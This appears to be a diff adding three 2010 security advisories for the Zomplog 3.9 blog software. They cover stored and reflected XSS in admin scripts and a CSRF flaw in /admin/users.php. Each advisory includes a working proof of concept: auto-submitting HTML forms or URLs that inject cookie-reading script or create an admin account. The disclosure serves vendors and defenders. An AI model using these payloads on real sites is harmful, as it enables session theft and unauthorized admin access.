@@ -1,0 +1,94 @@
+Vulnerability ID: HTB22643
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_zomplog_1.html
+Product: Zomplog
+Vendor: Gerben Schmidt ( http://www.zomp.nl/zomplog/ ) 
+Vulnerable Version: 3.9 and probably prior versions
+Vendor Notification: 13 October 2010 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "/admin/settings_menu.php" script to properly sanitize user-supplied input in "about" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/settings_menu.php" method="post" enctype="multipart/form-data" name="main">
+<input type="hidden" name="Submit" value="Submit ››">
+<input type="hidden" name="search" value="1">
+<input type="hidden" name="teasers" value="1">
+<input type="hidden" name="archive" value="1">
+<input type="hidden" name="latestentries" value="1">
+<input type="hidden" name="nr_entries" value="10">
+<input type="hidden" name="latestcomments" value="1">
+<input type="hidden" name="nr_comments" value="10">
+<input type="hidden" name="categories" value="1">
+<input type="hidden" name="authors" value="1">
+<input type="hidden" name="pages" value="1">
+<input type="hidden" name="meta" value="1">
+<input type="hidden" name="login" value="1">
+<input type="hidden" name="use_join" value="1">
+<input type="hidden" name="powered" value="1">
+<input type="hidden" name="about" value='about"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="customfield" value="customfield">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+-----------------------------------------------------------------------------------------------------------------
+
+Vulnerability ID: HTB22644
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_zomplog_2.html
+Product: Zomplog
+Vendor: Gerben Schmidt ( http://www.zomp.nl/zomplog/ ) 
+Vulnerable Version: 3.9 and probably prior versions
+Vendor Notification: 13 October 2010 
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "/admin/editor_pages.php" script to properly sanitize user-supplied input in "id" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+http://host/admin/editor_pages.php?id=1'"><script>alert(document.cookie)</script>
+
+
+-----------------------------------------------------------------------------------------------------------------
+
+Vulnerability ID: HTB22645
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_zomplog.html
+Product: Zomplog
+Vendor: Gerben Schmidt ( http://www.zomp.nl/zomplog/ )
+Vulnerable Version: 3.9 and probably prior versions
+Vendor Notification: 13 October 2010
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/admin/users.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/users.php" method="post">
+<input type="hidden" name="login" value="newuserlogin">
+<input type="hidden" name="password" value="password">
+<input type="hidden" name="password2" value="password">
+<input type="hidden" name="admin" value="1">
+<input type="submit" id="btn" name="submit" value="Submit ››">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
